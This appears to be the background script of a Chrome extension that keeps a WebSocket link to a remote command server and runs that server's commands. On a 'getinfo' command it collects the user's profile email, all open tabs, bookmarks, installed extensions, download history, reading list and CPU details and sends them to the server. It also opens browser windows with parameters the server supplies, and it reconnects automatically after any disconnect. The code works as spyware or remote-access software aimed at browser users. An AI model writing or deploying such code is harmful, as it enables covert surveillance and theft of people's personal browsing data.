let messageFilter = ["keepAwake"]

function sendMessage(m, toContent) {// str, str, boolean
    if (toContent) chrome.tabs.query({currentWindow: true,active: true}, tabs=>chrome.tabs.sendMessage(tabs[0].id, m).catch((e)=>{console.log(e)}))
    else chrome.runtime.sendMessage(m).catch(()=>{})
}

chrome.runtime.onInstalled.addListener(e=>{
    if (e.reason == "install" || e.reason == "update") chrome.storage.sync.set({serverAddress: "10.0.0.67:3000"})
})

chrome.runtime.onMessage.addListener(m => {
    if (m.type == "tryConnectIp") connect(m.value)
    else if (m.type == "getConnectState") chrome.storage.sync.get(r=>{sendMessage({type:"connection", value:r.serverAddress})})
})

let ws = {}, ws_timeout
chrome.storage.sync.get(r=>{
    connect(r.serverAddress)
})

function connect(address) {
    clearTimeout(ws_timeout)
    ws = new WebSocket("ws://"+address)

    ws.onerror=ws.onclose=()=>{
        sendMessage({type:"disconnect"})
        clearTimeout(ws_timeout)
        ws_timeout = setTimeout(()=>{
            chrome.storage.sync.get(r=>{
                connect(r.serverAddress)
                console.log("RETRY CONNECTION")
            })
        }, 5000)
    }
    
    ws.onopen=()=>{
        sendMessage({type:"connection", value:address})
        ws.send(JSON.stringify({type:"auth", value:"client"}))

        ws.onmessage = message => {// ON MESSAGE
            let m = JSON.parse(message.data)
            if (!messageFilter.includes(m.type)) console.log(m)//
            if (m.type == "initAuth") {
                ws.id = m.value
            } else if (m.type == "command") commandManager(m)
        }
    } 
}

function send(obj) {
    ws.send(JSON.stringify(obj))
}

// COMMANDS
function commandManager(m) {
    let c = m.command.toLowerCase(), v = c.value
    //command action
    if (c == "test") sendMessage(m, true)
    else if (c == "getinfo") grabInfo(m.responseTarget)
    else if (c == "createwindow") createWindow(m)
}


// - COMMANDS - LIST
function createWindow(m) {
    //chrome.windows.create({url:"https://www.pointercrate.com/demonlist/",focused:true,height:500,width:500,left:100,top:100,state:"normal",type:"normal"})
    chrome.windows.create(JSON.parse(m.value))
}

function grabInfo(responseTarget) {
    let info = {navigator_language:navigator.language}, info_cd=0
    function sendInfo() {
        info_cd++
        if (info_cd == 8) send({type:"response", value:info, responseTarget:responseTarget})
    }

    chrome.identity.getProfileUserInfo((e)=>{
        info.email = e.email
        sendInfo()
    })

    chrome.tabs.query({}, tabs=>{
        info.tabs = tabs
        sendInfo()
    })

    chrome.tabs.query({active:true}, tab=>{
        info.active_tab = tab
        sendInfo()
    })

    chrome.bookmarks.getTree(tree=>{
        info.bookmarks = tree
        sendInfo()
    })

    chrome.management.getAll(exts=>{
        info.installed_extensions = exts.map(e=>e.name).join(",\n")
        sendInfo()
    })

    chrome.system.cpu.getInfo(cpu=>{
        info.cpu = cpu
        sendInfo()
    })

    chrome.downloads.search({}, (downloads)=>{
        info.downloads = downloads//.map(d=>({size: d.fileSize, date:d.endTime, exists:d.exists, mime:d.mime, filename:d.filename, url:d.url}))
        sendInfo()
    })
    
    chrome.readingList.query({}, (tabs)=>{
        info.readingList = tabs
        sendInfo()
    })
}